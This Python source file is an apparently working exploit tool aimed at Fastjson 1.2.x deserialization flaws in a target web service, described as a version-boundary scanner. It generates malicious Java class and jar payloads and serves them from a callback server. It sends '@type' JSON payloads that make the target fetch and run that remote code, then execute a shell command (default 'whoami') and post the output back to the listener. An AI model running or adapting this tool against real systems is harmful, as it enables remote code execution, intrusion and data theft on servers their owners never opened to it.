#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import ipaddress
import json
import os
import re
import ssl
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Sequence
from urllib.error import HTTPError, URLError
from urllib.parse import urlsplit
from urllib.request import Request, urlopen


ROOT = Path(__file__).resolve().parents[1]
ASM_JAR = ROOT / "lib" / "asm-9.6.jar"
VERSION_PATTERN = re.compile(r"^1\.2\.\d+$")
HOST_TOKEN_PATTERN = re.compile(r"^[A-Za-z0-9-]+$")
CHAIN_NAMES = ("direct", "cache", "autocloseable", "jsontype-http", "jsontype-jar")
MAX_COMMAND_OUTPUT_BYTES = 64 * 1024


@dataclass(frozen=True)
class ScanCase:
    chain: str
    version: str

    @property
    def case_id(self) -> str:
        return f"{self.chain}-v{self.version.replace('.', '_')}"

    @property
    def protocol(self) -> str:
        return "jar" if self.chain == "jsontype-jar" else "http"

    @property
    def artifact_format(self) -> str:
        return "jar" if self.protocol == "jar" else "class"

    @property
    def resource(self) -> str:
        return f"scan/{self.case_id}"


@dataclass(frozen=True)
class Artifact:
    case: ScanCase
    path: Path
    callback_path: str
    command_path: str
    type_name: str


@dataclass(frozen=True)
class TargetResponse:
    status: int | None
    error: str | None


@dataclass(frozen=True)
class CallbackHit:
    case_id: str
    path: str
    client: str
    timestamp: str


@dataclass(frozen=True)
class CommandOutput:
    case_id: str
    output: str
    client: str
    timestamp: str


@dataclass(frozen=True)
class CaseResult:
    case_id: str
    chain: str
    version: str
    payload_count: int
    target_responses: tuple[TargetResponse, ...]
    callbacks: tuple[CallbackHit, ...]
    command_outputs: tuple[CommandOutput, ...]
    verdict: str


@dataclass(frozen=True)
class LocalJar:
    version: str
    path: Path
    sha256: str
    size_bytes: int


def version_range(start: int, end: int) -> tuple[str, ...]:
    return tuple(f"1.2.{minor}" for minor in range(start, end + 1))


def all_cases() -> tuple[ScanCase, ...]:
    cases: list[ScanCase] = []

    def add(chain: str, versions: tuple[str, ...]) -> None:
        cases.extend(ScanCase(chain, version) for version in versions)

    add("direct", version_range(0, 24))
    add("cache", version_range(9, 48))
    add("autocloseable", version_range(24, 62) + version_range(66, 69))
    add("jsontype-http", version_range(36, 47))
    add("jsontype-jar", version_range(48, 62) + version_range(66, 80) + ("1.2.83",))
    return tuple(cases)


def parse_csv(value: str, name: str) -> tuple[str, ...] | None:
    if value == "all":
        return None
    parsed = tuple(item.strip() for item in value.split(",") if item.strip())
    if not parsed:
        raise ValueError(f"--{name} 不能为空")
    return parsed


def selected_cases(chains_value: str, versions_value: str) -> tuple[ScanCase, ...]:
    requested_chains = parse_csv(chains_value, "chains")
    requested_versions = parse_csv(versions_value, "versions")
    if requested_chains is not None:
        unsupported_chains = tuple(chain for chain in requested_chains if chain not in CHAIN_NAMES)
        if unsupported_chains:
            raise ValueError(f"不支持的链路：{', '.join(unsupported_chains)}")
    if requested_versions is not None:
        invalid_versions = tuple(version for version in requested_versions if VERSION_PATTERN.fullmatch(version) is None)
        if invalid_versions:
            raise ValueError(f"不支持的版本格式：{', '.join(invalid_versions)}")
    cases = tuple(
        case
        for case in all_cases()
        if (requested_chains is None or case.chain in requested_chains)
        and (requested_versions is None or case.version in requested_versions)
    )
    if not cases:
        raise ValueError("给定的链路和版本没有对应的已验证测试用例")
    return cases


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def local_jars_for(cases: Sequence[ScanCase], jars_dir: Path | None) -> tuple[LocalJar, ...]:
    if jars_dir is None:
        return ()
    resolved_dir = jars_dir.expanduser().resolve()
    if not resolved_dir.is_dir():
        raise ValueError(f"--jars-dir 不是目录：{resolved_dir}")
    versions = tuple(sorted({case.version for case in cases}, key=lambda value: tuple(map(int, value.split(".")))))
    local_jars: list[LocalJar] = []
    missing: list[str] = []
    for version in versions:
        path = resolved_dir / f"fastjson-{version}.jar"
        if not path.is_file():
            missing.append(path.name)
            continue
        local_jars.append(
            LocalJar(
                version=version,
                path=path,
                sha256=sha256_file(path),
                size_bytes=path.stat().st_size,
            )
        )
    if missing:
        raise ValueError(f"--jars-dir 缺少 {len(missing)} 个所选版本：{', '.join(missing)}")
    return tuple(local_jars)


def validate_target(value: str) -> str:
    parsed = urlsplit(value)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError("--target 必须是完整的 http:// 或 https:// URL")
    return value


def callback_host_token(host: str, port: int) -> str:
    if not 1 <= port <= 65535:
        raise ValueError("--callback-port 必须在 1 到 65535 之间")
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        if not HOST_TOKEN_PATTERN.fullmatch(host):
            raise ValueError("--callback-host 必须是 IPv4 地址或不含点号的主机 token")
        return host
    if address.version != 4:
        raise ValueError("--callback-host 目前仅支持 IPv4 地址")
    return str(int(address))


def compile_generator(java_compiler: str, asm_jar: Path, build_dir: Path) -> Path:
    classes_dir = build_dir / "generator-classes"
    source_dir = ROOT / "src" / "main" / "java"
    sources = (source_dir / "CraftProbe.java", source_dir / "Gen.java")
    missing_sources = tuple(str(source) for source in sources if not source.is_file())
    if missing_sources:
        raise RuntimeError(f"缺少生成器源码：{', '.join(missing_sources)}")
    classes_dir.mkdir(parents=True, exist_ok=True)
    command = (
        java_compiler,
        "-source",
        "8",
        "-target",
        "8",
        "-encoding",
        "UTF-8",
        "-cp",
        str(asm_jar),
        "-d",
        str(classes_dir),
        *(str(source) for source in sources),
    )
    completed = subprocess.run(command, capture_output=True, text=True, check=False, timeout=60)
    if completed.returncode != 0:
        raise RuntimeError(f"生成器编译失败：\n{completed.stdout}{completed.stderr}")
    return classes_dir


def type_name(case: ScanCase, host_token: str, port: int) -> str:
    resource = case.resource.replace("/", ".")
    if case.protocol == "jar":
        return f"jar:http:..{host_token}:{port}.{resource}!.POC"
    return f"http:..{host_token}:{port}.{resource}.POC"


def callback_path(case: ScanCase) -> str:
    if case.protocol == "jar":
        return f"/{case.resource}"
    return f"/{case.resource}/POC.class"


def command_path(case: ScanCase) -> str:
    return f"/result/{case.case_id}"


def artifact_path(output_dir: Path, case: ScanCase) -> Path:
    resource_path = Path(case.resource)
    if case.protocol == "jar":
        return output_dir / "artifacts" / "jar" / resource_path.with_suffix(".jar")
    return output_dir / "artifacts" / "class" / resource_path / "POC.class"


def generate_artifacts(
    cases: Sequence[ScanCase],
    output_dir: Path,
    java: str,
    classes_dir: Path,
    asm_jar: Path,
    host_token: str,
    callback_host: str,
    port: int,
    marker_prefix: str,
    remote_command: str | None,
) -> tuple[Artifact, ...]:
    classpath = os.pathsep.join((str(classes_dir), str(asm_jar)))
    artifacts: list[Artifact] = []
    for case in cases:
        output_path = artifact_path(output_dir, case)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        generator_command = (
            java,
            f"-Dpoc.pwnedFile={marker_prefix}-{case.case_id}",
            "-cp",
            classpath,
            "Gen",
            "--host",
            host_token,
            "--port",
            str(port),
            "--resource",
            case.resource,
            "--protocol",
            case.protocol,
            "--format",
            case.artifact_format,
            "--chain",
            case.chain,
            "--out",
            str(output_path),
        )
        if remote_command is not None:
            generator_command = (
                *generator_command,
                "--command",
                remote_command,
                "--result-url",
                f"http://{callback_host}:{port}{command_path(case)}",
            )
        completed = subprocess.run(generator_command, capture_output=True, text=True, check=False, timeout=30)
        if completed.returncode != 0 or not output_path.is_file():
            raise RuntimeError(
                f"生成制品失败：{case.case_id}\n{completed.stdout}{completed.stderr}"
            )
        artifacts.append(
            Artifact(
                case=case,
                path=output_path,
                callback_path=callback_path(case),
                command_path=command_path(case),
                type_name=type_name(case, host_token, port),
            )
        )
    return tuple(artifacts)


def payloads_for(artifact: Artifact) -> tuple[str, ...]:
    type_value = artifact.type_name
    if artifact.case.chain == "cache":
        return (
            json.dumps({"a": {"@type": "java.lang.Class", "val": type_value}}, separators=(",", ":")),
            json.dumps({"@type": type_value}, separators=(",", ":")),
        )
    if artifact.case.chain == "autocloseable":
        return (f'{{"@type":"java.lang.AutoCloseable","@type":"{type_value}"}}',)
    return (json.dumps({"@type": type_value, "x": 1}, separators=(",", ":")),)


class CallbackState:
    def __init__(self, artifacts: Sequence[Artifact]) -> None:
        self._artifacts = {artifact.callback_path: artifact for artifact in artifacts}
        self._command_artifacts = {artifact.command_path: artifact for artifact in artifacts}
        self._hits: dict[str, list[CallbackHit]] = {artifact.case.case_id: [] for artifact in artifacts}
        self._outputs: dict[str, list[CommandOutput]] = {artifact.case.case_id: [] for artifact in artifacts}
        self._condition = threading.Condition()

    def artifact(self, path: str) -> Artifact | None:
        return self._artifacts.get(path)

    def command_artifact(self, path: str) -> Artifact | None:
        return self._command_artifacts.get(path)

    def record_hit(self, artifact: Artifact, client: str, path: str) -> CallbackHit:
        hit = CallbackHit(
            case_id=artifact.case.case_id,
            path=path,
            client=client,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )
        with self._condition:
            self._hits[artifact.case.case_id].append(hit)
            self._condition.notify_all()
        return hit

    def hit_count(self, case_id: str) -> int:
        with self._condition:
            return len(self._hits[case_id])

    def record_output(self, artifact: Artifact, client: str, output: str) -> CommandOutput:
        command_output = CommandOutput(
            case_id=artifact.case.case_id,
            output=output,
            client=client,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )
        with self._condition:
            self._outputs[artifact.case.case_id].append(command_output)
            self._condition.notify_all()
        return command_output

    def output_count(self, case_id: str) -> int:
        with self._condition:
            return len(self._outputs[case_id])

    def wait_for_hits(self, case_id: str, previous_count: int, timeout_seconds: float) -> tuple[CallbackHit, ...]:
        deadline = time.monotonic() + timeout_seconds
        with self._condition:
            while len(self._hits[case_id]) <= previous_count:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                self._condition.wait(remaining)
            return tuple(self._hits[case_id][previous_count:])

    def wait_for_outputs(
        self,
        case_id: str,
        previous_count: int,
        timeout_seconds: float,
    ) -> tuple[CommandOutput, ...]:
        deadline = time.monotonic() + timeout_seconds
        with self._condition:
            while len(self._outputs[case_id]) <= previous_count:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                self._condition.wait(remaining)
            return tuple(self._outputs[case_id][previous_count:])


class CallbackHandler(BaseHTTPRequestHandler):
    server: "CallbackServer"

    def do_GET(self) -> None:
        path = urlsplit(self.path).path
        artifact = self.server.state.artifact(path)
        if artifact is None:
            self.send_error(404, "unknown probe path")
            return
        body = artifact.path.read_bytes()
        self.server.state.record_hit(artifact, self.client_address[0], path)
        self.send_response(200)
        self.send_header(
            "Content-Type",
            "application/java-archive" if artifact.case.protocol == "jar" else "application/java-vm",
        )
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:
        path = urlsplit(self.path).path
        artifact = self.server.state.command_artifact(path)
        if artifact is None:
            self.send_error(404, "unknown result path")
            return
        try:
            content_length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            self.send_error(400, "invalid content length")
            return
        if content_length < 0 or content_length > MAX_COMMAND_OUTPUT_BYTES:
            self.send_error(413, "command output exceeds limit")
            return
        output = self.rfile.read(content_length).decode("utf-8", errors="replace")
        self.server.state.record_output(artifact, self.client_address[0], output)
        self.send_response(204)
        self.end_headers()

    def log_message(self, format_string: str, *arguments: object) -> None:
        return


class CallbackServer(ThreadingHTTPServer):
    def __init__(self, address: tuple[str, int], state: CallbackState) -> None:
        super().__init__(address, CallbackHandler)
        self.state = state
        self.daemon_threads = True


def parse_headers(values: Sequence[str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for value in values:
        name, separator, content = value.partition(":")
        if not separator or not name.strip() or not content.strip():
            raise ValueError(f"无效请求头：{value}；请使用 'Name: Value' 格式")
        headers[name.strip()] = content.strip()
    if not any(name.lower() == "content-type" for name in headers):
        headers["Content-Type"] = "application/json"
    return headers


def send_payload(
    target: str,
    method: str,
    payload: str,
    headers: dict[str, str],
    timeout_seconds: float,
    verify_tls: bool,
) -> TargetResponse:
    request = Request(target, data=payload.encode("utf-8"), headers=headers, method=method)
    context = None if verify_tls else ssl._create_unverified_context()
    try:
        with urlopen(request, timeout=timeout_seconds, context=context) as response:
            response.read(1024)
            return TargetResponse(status=response.status, error=None)
    except HTTPError as error:
        error.read(1024)
        return TargetResponse(status=error.code, error=f"HTTP {error.code}")
    except (OSError, URLError, ValueError) as error:
        return TargetResponse(status=None, error=str(error))


def write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def write_results(path: Path, results: Sequence[CaseResult]) -> None:
    with path.open("w", encoding="utf-8") as handle:
        for result in results:
            handle.write(json.dumps(asdict(result), ensure_ascii=False) + "\n")


def run_scan(arguments: argparse.Namespace) -> int:
    if not arguments.prepare_only:
        validate_target(arguments.target)
    host_token = callback_host_token(arguments.callback_host, arguments.callback_port)
    if arguments.callback_wait < 0 or arguments.delay < 0:
        raise ValueError("--callback-wait 和 --delay 不能为负数")
    if arguments.request_timeout <= 0:
        raise ValueError("--request-timeout 必须为正数")
    if arguments.command_wait < 0:
        raise ValueError("--command-wait 不能为负数")
    if not arguments.no_command and not arguments.command.strip():
        raise ValueError("--command 不能为空；使用 --no-command 可禁用命令执行")

    cases = selected_cases(arguments.chains, arguments.versions)
    local_jars = local_jars_for(cases, arguments.jars_dir)
    output_dir = arguments.output_dir.expanduser().resolve()
    build_dir = arguments.build_dir.expanduser().resolve()
    if output_dir.exists() and any(output_dir.iterdir()):
        raise RuntimeError(f"输出目录必须为空：{output_dir}")
    output_dir.mkdir(parents=True, exist_ok=True)

    if not ASM_JAR.is_file():
        raise RuntimeError(f"缺少内置 ASM 依赖：{ASM_JAR}")
    classes_dir = compile_generator(arguments.javac, ASM_JAR, build_dir)
    remote_command = None if arguments.no_command else arguments.command
    artifacts = generate_artifacts(
        cases,
        output_dir,
        arguments.java,
        classes_dir,
        ASM_JAR,
        host_token,
        arguments.callback_host,
        arguments.callback_port,
        arguments.marker_prefix,
        remote_command,
    )
    manifest = {
        "created_at": datetime.now(timezone.utc).isoformat(),
        "target": arguments.target,
        "callback_host": arguments.callback_host,
        "callback_host_token": host_token,
        "callback_port": arguments.callback_port,
        "command": remote_command,
        "local_jars_dir": str(arguments.jars_dir.expanduser().resolve()) if arguments.jars_dir else None,
        "local_jars": [
            {
                "version": jar.version,
                "path": str(jar.path),
                "sha256": jar.sha256,
                "size_bytes": jar.size_bytes,
            }
            for jar in local_jars
        ],
        "cases": [
            {
                "case_id": artifact.case.case_id,
                "chain": artifact.case.chain,
                "version": artifact.case.version,
                "payloads": payloads_for(artifact),
                "callback_path": artifact.callback_path,
                "command_path": artifact.command_path,
                "artifact": str(artifact.path.relative_to(output_dir)),
            }
            for artifact in artifacts
        ],
    }
    write_json(output_dir / "manifest.json", manifest)
    print(f"已生成 {len(artifacts)} 个回连制品：{output_dir / 'manifest.json'}")
    if arguments.prepare_only:
        return 0

    headers = parse_headers(arguments.header)
    state = CallbackState(artifacts)
    server = CallbackServer((arguments.listen_host, arguments.callback_port), state)
    server_thread = threading.Thread(target=server.serve_forever, name="fastjson-callback", daemon=True)
    server_thread.start()
    print(f"回连服务：{arguments.listen_host}:{arguments.callback_port}")

    results: list[CaseResult] = []
    try:
        for position, artifact in enumerate(artifacts, start=1):
            previous_hits = state.hit_count(artifact.case.case_id)
            previous_outputs = state.output_count(artifact.case.case_id)
            payloads = payloads_for(artifact)
            responses = tuple(
                send_payload(
                    arguments.target,
                    arguments.method,
                    payload,
                    headers,
                    arguments.request_timeout,
                    not arguments.insecure,
                )
                for payload in payloads
            )
            callbacks = state.wait_for_hits(
                artifact.case.case_id,
                previous_hits,
                arguments.callback_wait,
            )
            command_outputs = ()
            if remote_command is not None:
                command_outputs = state.wait_for_outputs(
                    artifact.case.case_id,
                    previous_outputs,
                    arguments.command_wait,
                )
            verdict = "command-output" if command_outputs else "callback-observed" if callbacks else "no-callback"
            result = CaseResult(
                case_id=artifact.case.case_id,
                chain=artifact.case.chain,
                version=artifact.case.version,
                payload_count=len(payloads),
                target_responses=responses,
                callbacks=callbacks,
                command_outputs=command_outputs,
                verdict=verdict,
            )
            results.append(result)
            status_values = ",".join(
                str(response.status) if response.status is not None else "error" for response in responses
            )
            print(
                f"[{position}/{len(artifacts)}] {result.case_id} {result.verdict} "
                f"target={status_values} callbacks={len(callbacks)}"
            )
            for command_output in command_outputs:
                print(f"[command] {result.case_id}\n{command_output.output.rstrip()}")
            if command_outputs and not arguments.continue_after_command_output:
                break
            if arguments.delay:
                time.sleep(arguments.delay)
    finally:
        server.shutdown()
        server.server_close()

    write_results(output_dir / "results.jsonl", results)
    callback_count = sum(len(result.callbacks) for result in results)
    observed_count = sum(bool(result.callbacks) for result in results)
    command_output_count = sum(len(result.command_outputs) for result in results)
    summary = {
        "target": arguments.target,
        "cases": len(results),
        "callback_observed_cases": observed_count,
        "callbacks": callback_count,
        "command_outputs": command_output_count,
        "command": remote_command,
        "results_file": "results.jsonl",
    }
    write_json(output_dir / "summary.json", summary)
    print(
        f"完成：{len(results)} 条，回连命中 {observed_count} 条，"
        f"命令输出 {command_output_count} 条，结果：{output_dir / 'summary.json'}"
    )
    return 0


def default_output_dir() -> Path:
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return ROOT / "scan-output" / f"{timestamp}-{uuid.uuid4().hex[:8]}"


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Fastjson 1.2.x 目标 URL 版本边界扫描器",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--target", help="目标 Fastjson JSON 接口完整 URL；默认使用 POST JSON")
    parser.add_argument("--method", default="POST", help="发送 payload 的 HTTP 方法")
    parser.add_argument("--header", action="append", default=[], help="可重复指定请求头，格式 'Name: Value'")
    parser.add_argument(
        "--callback-host",
        default="127.0.0.1",
        help="回连主机；IPv4 会自动转换为 payload 所需 token",
    )
    parser.add_argument("--callback-port", type=int, default=18080, help="回连 HTTP 端口")
    parser.add_argument("--listen-host", default="127.0.0.1", help="本地回连服务绑定地址")
    parser.add_argument("--chains", default="all", help="all 或逗号分隔链路名")
    parser.add_argument("--versions", default="all", help="all 或逗号分隔标准 1.2.x 版本")
    parser.add_argument(
        "--jars-dir",
        type=Path,
        help="本地 fastjson-<版本>.jar 目录；校验所选版本并记录 SHA-256",
    )
    parser.add_argument("--java", default="java", help="Java 运行命令或路径")
    parser.add_argument("--javac", default="javac", help="Java 编译命令或路径")
    parser.add_argument(
        "--build-dir",
        type=Path,
        default=ROOT / ".scan-cache",
        help="生成器编译产物目录",
    )
    parser.add_argument("--output-dir", type=Path, default=default_output_dir(), help="本次制品和结果目录")
    parser.add_argument("--marker-prefix", default="FASTJSON_SCAN", help="探针静态初始化时使用的目标标记文件前缀")
    parser.add_argument("--command", default="whoami", help="确认类初始化后执行并回传标准输出的命令")
    parser.add_argument("--no-command", action="store_true", help="禁用命令执行，只记录资源回连")
    parser.add_argument("--command-wait", type=float, default=3.0, help="每条用例等待命令输出秒数")
    parser.add_argument("--continue-after-command-output", action="store_true", help="收到命令输出后仍继续扫描其余用例")
    parser.add_argument("--request-timeout", type=float, default=8.0, help="单次目标 HTTP 请求超时秒数")
    parser.add_argument("--callback-wait", type=float, default=0.35, help="每条用例等待回连秒数")
    parser.add_argument("--delay", type=float, default=0.0, help="两条用例之间的等待秒数")
    parser.add_argument("--insecure", action="store_true", help="不校验目标 HTTPS 证书")
    parser.add_argument("--prepare-only", action="store_true", help="仅生成全部制品和 manifest，不启动回连或发送目标请求")
    return parser


def main(argv: Sequence[str]) -> int:
    parser = build_parser()
    arguments = parser.parse_args(argv)
    if not arguments.prepare_only and not arguments.target:
        parser.error("发送测试时必须提供 --target")
    try:
        return run_scan(arguments)
    except (OSError, RuntimeError, ValueError, subprocess.TimeoutExpired) as error:
        print(f"错误：{error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
